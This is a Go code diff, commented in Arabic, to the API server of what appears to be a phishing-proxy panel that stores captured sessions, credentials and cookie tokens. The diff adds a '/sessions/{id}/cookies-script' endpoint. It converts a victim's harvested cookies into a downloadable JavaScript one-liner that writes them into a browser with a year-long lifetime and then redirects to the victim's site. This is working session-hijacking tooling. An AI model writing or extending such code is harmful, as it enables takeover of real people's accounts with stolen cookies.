@@ -105,13 +105,6 @@ func (as *ApiServer) Start() {
 	router := mux.NewRouter()
 	router.Use(as.handleHeaders)
 	
-	// التحقق من مسار الملفات الثابتة
-	log.Debug("تحميل الملفات الثابتة من المسار: ./static")
-	if _, err := os.Stat("./static"); os.IsNotExist(err) {
-		log.Error("مجلد الملفات الثابتة (static) غير موجود في: ./static")
-	} else {
-		log.Success("تم العثور على مجلد الملفات الثابتة (static) في: ./static")
-	}
 	
 	// إضافة سجلات تصحيح لعرض معلومات الاعتماد
 	log.Debug("بيانات الاعتماد للواجهة - اسم المستخدم: %s، كلمة المرور: %s", as.username, as.password)
@@ -146,6 +139,9 @@ func (as *ApiServer) Start() {
 	authorized.HandleFunc("/sessions", as.sessionsHandler).Methods("GET")
 	authorized.HandleFunc("/sessions/{id}", as.sessionHandler).Methods("GET", "DELETE")
 	authorized.HandleFunc("/credentials", as.credsHandler).Methods("GET")
+
+	// إضافة نقطة نهاية جديدة للحصول على الكوكيز بتنسيق JavaScript
+	authorized.HandleFunc("/sessions/{id}/cookies-script", as.sessionCookiesScriptHandler).Methods("GET")
 
 	// خطة لتعامل مع الواجهة
 	// تعامل مع الملفات الثابتة بما فيها ملف الـ dashboard.html
@@ -1307,4 +1303,96 @@ func min(a, b int) int {
 		return a
 	}
 	return b
+}
+
+// sessionCookiesScriptHandler - معالج لإنشاء سكريبت جافاسكريبت لاستيراد الكوكيز
+func (as *ApiServer) sessionCookiesScriptHandler(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	sessionId, err := strconv.Atoi(vars["id"])
+	if err != nil {
+		as.jsonError(w, "معرف الجلسة غير صالح", http.StatusBadRequest)
+		return
+	}
+	
+	// الحصول على الجلسة من قاعدة البيانات
+	session, err := as.db.GetSessionById(sessionId)
+	if err != nil {
+		as.jsonError(w, "الجلسة غير موجودة: "+err.Error(), http.StatusNotFound)
+		return
+	}
+	
+	// تحويل الكوكيز إلى تنسيق StorageAce/كروم
+	type ChromeCookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly"`
+		HostOnly       bool   `json:"hostOnly"`
+		Secure         bool   `json:"secure"`
+		Session        bool   `json:"session"`
+		StoreId        string `json:"storeId"`
+	}
+	
+	var cookies []*ChromeCookie
+	
+	// تحويل كل كوكي إلى التنسيق المطلوب
+	for domain, tokenMap := range session.CookieTokens {
+		for name, token := range tokenMap {
+			hostOnly := true
+			// تعيين hostOnly إلى false إذا كان المجال يبدأ بنقطة
+			if len(domain) > 0 && domain[0] == '.' {
+				hostOnly = false
+			}
+			
+			cookie := &ChromeCookie{
+				Path:           token.Path,
+				Domain:         domain,
+				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
+				Value:          token.Value,
+				Name:           name,
+				HttpOnly:       token.HttpOnly,
+				HostOnly:       hostOnly,
+				Secure:         true,
+				Session:        false,
+				StoreId:        "null",
+			}
+			
+			// تأكد من أن Path له قيمة
+			if cookie.Path == "" {
+				cookie.Path = "/"
+			}
+			
+			cookies = append(cookies, cookie)
+		}
+	}
+	
+	// تحويل الكوكيز إلى JSON
+	cookiesJSON, err := json.Marshal(cookies)
+	if err != nil {
+		as.jsonError(w, "خطأ في تنسيق الكوكيز: "+err.Error(), http.StatusInternalServerError)
+		return
+	}
+	
+	// إنشاء ملف نصي مع البريد الإلكتروني ورقم فريد (نستخدم معرف الجلسة ووقت الطلب)
+	emailPart := ""
+	if session.Username != "" {
+		emailPart = session.Username
+	} else {
+		emailPart = "user"
+	}
+	
+	timestamp := time.Now().Unix()
+	uniqueId := fmt.Sprintf("%s_%d_%d", emailPart, sessionId, timestamp)
+	
+	// بناء نص JavaScript للتنفيذ المباشر
+	jsScript := fmt.Sprintf(`!function(){let e=JSON.parse(%s);for(let o of e)document.cookie=`+"`${o.name}=${o.value};Max-Age=31536000;${o.path?`path=${o.path};`:\"\"}`"+`;${o.domain?`${o.path?\"\":\"path=/;\"};`:\"\"}`+`Secure;SameSite=None`;window.location.href="https://%s"}();`, string(cookiesJSON), cookies[0].Domain)
+	
+	// إعداد رأس الاستجابة للتنزيل
+	fileName := fmt.Sprintf("cookies_%s.js", uniqueId)
+	w.Header().Set("Content-Disposition", "attachment; filename="+fileName)
+	w.Header().Set("Content-Type", "application/javascript")
+	w.Header().Set("Cache-Control", "no-cache")
+	w.Write([]byte(jsScript))
 } 
